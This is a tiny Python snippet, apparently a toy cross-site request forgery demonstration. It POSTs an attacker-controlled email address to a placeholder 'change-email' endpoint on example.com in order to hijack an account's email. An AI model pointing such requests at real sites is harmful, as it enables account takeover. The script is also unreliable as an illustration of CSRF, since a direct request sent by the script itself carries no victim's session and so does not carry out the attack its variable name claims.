import requests

csrf_url = "https://example.com/change-email"
data = {"email": "attacker@example.com"}

response = requests.post(csrf_url, data=data)

print(response.text)